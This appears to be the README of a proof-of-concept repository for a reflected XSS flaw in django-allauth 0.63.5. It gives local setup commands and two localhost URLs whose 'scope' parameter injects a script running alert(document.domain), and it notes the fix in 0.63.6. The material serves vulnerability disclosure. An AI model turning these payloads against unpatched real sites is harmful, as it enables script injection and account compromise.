# Proof of concept for a XSS vulnerability in django-allauth 0.63.5

You can read the full post [here](https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/).

## Requirements

- Python
- [uv](https://docs.astral.sh/uv/getting-started/installation/)

## Set up

```bash
$ git clone https://github.com/stsewd/poc-xss-django-allauth
$ cd poc-xss-django-allauth
$ uv run manage.py migrate
# Create a user to log into the application.
$ uv run manage.py createsuperuser
$ uv run manage.py runserver
```

## Proof of concept

**XSS in login page**

- While logged out, go to ``http://127.0.0.1:8000/accounts/login/?scope=</script><script>alert(document.domain)</script><script>``

**XSS in social connections page**

- Go to ``http://127.0.0.1:8000/accounts/login/``
- Log in with the user you created
- Go to ``http://127.0.0.1:8000/accounts/3rdparty/?scope=</script><script>alert(document.domain)</script><script>``

Try updating the project to use django-allauth 0.63.6, and repeat the steps to see that the vulnerability is fixed.

```bash
$ uv add django-allauth==0.63.6
```
